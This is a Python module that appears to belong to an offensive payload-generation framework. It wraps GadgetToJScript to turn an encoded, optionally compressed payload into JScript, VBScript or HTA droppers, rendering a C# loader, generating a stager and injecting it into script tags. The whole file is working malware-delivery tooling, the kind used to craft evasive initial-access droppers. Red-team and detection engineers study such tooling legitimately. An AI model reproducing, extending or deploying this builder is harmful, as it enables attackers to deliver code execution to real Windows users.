import os
import sys
import logging
import uuid
import shutil
import jinja2
from .lib.g2js import G2JSRunner
from .lib.stagers import JScriptStager, VBScriptStager

# Configure logging
logger = logging.getLogger("g2js_adapter")

def encode(input_filepath, original_filename, options):
    """
    Adapter function to run the GadgetToJScript pipeline.
    Renders a custom C# loader and orchestrates the generation.
    """
    
    # 1. Extract Options
    script_type = options.get('script_type', 'js')
    
    # Map options to template variables
    encoding_opt = options.get('bytecode_encoding', 'base64_encoder')
    compression_opt = options.get('bytecode_compression', '')
    debug_mode = options.get('debug', False)

    encoding_map = {
        'base64_encoder': 'base64',
        'base85_encoder': 'base85'
    }
    compression_map = {
        'mszip_compressor': 'mszip'
    }

    template_vars = {
        'encoding': encoding_map.get(encoding_opt, 'base64'),
        'compression': compression_map.get(compression_opt, ''),
        'debug': debug_mode
    }
    
    logger.info(f"Starting G2JS adapter for {original_filename}")
    logger.info(f"Options: {template_vars}")

    # Paths
    base_path = os.path.dirname(os.path.abspath(__file__))
    g2js_exe_path = "/app/bin/GadgetToJScript.exe"
    templates_dir = os.path.join(base_path, 'templates')
    
    job_name = os.environ.get("JOB_NAME", str(uuid.uuid4()))
    shared_volume_path = os.path.dirname(input_filepath)
    
    # 2. Render Loader.cs
    loader_cs_filename = f"{job_name}_Loader.cs"
    loader_cs_path = os.path.join(shared_volume_path, loader_cs_filename)
    
    try:
        env = jinja2.Environment(loader=jinja2.FileSystemLoader(templates_dir))
        template = env.get_template('loader.cs.j2')
        loader_code = template.render(**template_vars)
        
        with open(loader_cs_path, 'w') as f:
            f.write(loader_code)
            
        logger.info(f"Rendered custom loader to {loader_cs_path}")

        # 3. Read Payload (Input File from Transformer)
        # The input file contains the encoded (and optionally compressed) payload string.
        with open(input_filepath, 'r') as f:
            payload_string = f.read().strip()
            
        if not payload_string:
            raise ValueError("Input payload is empty.")

        # 4. Generate Stager Code (Env Vars)
        if script_type == 'vbs':
            stager = VBScriptStager()
        elif script_type in ['js', 'hta']:
            stager = JScriptStager()
        else:
            raise ValueError(f"Unsupported script type: {script_type}")
            
        metadata = {}
        if encoding_opt: metadata['ENCODING'] = encoding_opt
        if compression_opt: metadata['COMPRESSION'] = compression_opt
        
        stager_code = stager.generate_code(payload_string, metadata)

        # 5. Run G2JS (Compile Loader.cs -> Script with Gadget)
        temp_output_base = os.path.join(shared_volume_path, f"{job_name}_raw")
        runner = G2JSRunner(g2js_exe_path, loader_cs_path)
        
        # This returns the content of the generated script (containing the serialized gadget)
        raw_script_content = runner.run(script_type, temp_output_base)
        
        # 6. Synthesize (Inject Stager into Script)
        final_content = _synthesize(script_type, stager_code, raw_script_content)
        
        # 7. Write Final Artifact
        base_name, _ = os.path.splitext(original_filename)
        final_artifact_name = f"{base_name}.{script_type}"
        final_artifact_path = os.path.join(shared_volume_path, final_artifact_name)
        
        with open(final_artifact_path, 'w') as f:
            f.write(final_content)
            
        logger.info(f"G2JS generation successful: {final_artifact_name}")
        
        # Cleanup
        if os.path.exists(loader_cs_path): os.remove(loader_cs_path)
        if os.path.exists(f"{temp_output_base}.{script_type}"): os.remove(f"{temp_output_base}.{script_type}")

        return final_artifact_name

    except Exception as e:
        logger.exception(f"G2JS Adapter failed: {e}")
        # Attempt cleanup
        if 'loader_cs_path' in locals() and os.path.exists(loader_cs_path): os.remove(loader_cs_path)
        raise

def _synthesize(type, stager, loader):
    """
    Combines the Stager code (Env vars) with the Loader code (Gadget).
    """
    if type == 'hta':
        # Robust injection for HTA
        import re
        
        # Try to find an existing script tag (case insensitive)
        script_pattern = re.compile(r'(<script\s+language=["\'](?:javascript|jscript|vbscript)["\']\s*>)', re.IGNORECASE)
        match = script_pattern.search(loader)
        
        if match:
            tag = match.group(1)
            return loader.replace(tag, f"{tag}\n{stager}")
        
        # If no script tag found, try to inject after <head>
        head_pattern = re.compile(r'(<head\s*>)', re.IGNORECASE)
        match = head_pattern.search(loader)
        if match:
            tag = match.group(1)
            return loader.replace(tag, f"{tag}\n<script language=\"JScript\">\n{stager}\n</script>")
            
        # Fallback to after <html>
        html_pattern = re.compile(r'(<html\s*>)', re.IGNORECASE)
        match = html_pattern.search(loader)
        if match:
            tag = match.group(1)
            return loader.replace(tag, f"{tag}\n<script language=\"JScript\">\n{stager}\n</script>")

        # Last resort: Prepend
        return f"<script language=\"JScript\">\n{stager}\n</script>\n{loader}"
             
    # For JS/VBS, just prepend
    return stager + loader